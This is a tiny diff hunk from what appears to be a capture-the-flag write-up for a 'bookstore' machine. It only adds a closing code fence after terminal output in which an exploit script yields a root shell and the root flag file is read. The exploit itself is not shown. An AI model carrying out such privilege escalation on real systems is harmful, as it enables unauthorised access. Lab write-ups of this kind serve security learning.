@@ -256,5 +256,6 @@ sid@bookstore:~$ python3 exploit.py
   uid=0(root) gid=1000(sid) groups=1000(sid)
 # cat /root/root.txt
   e[removed]3
+```
 
 solved! :)
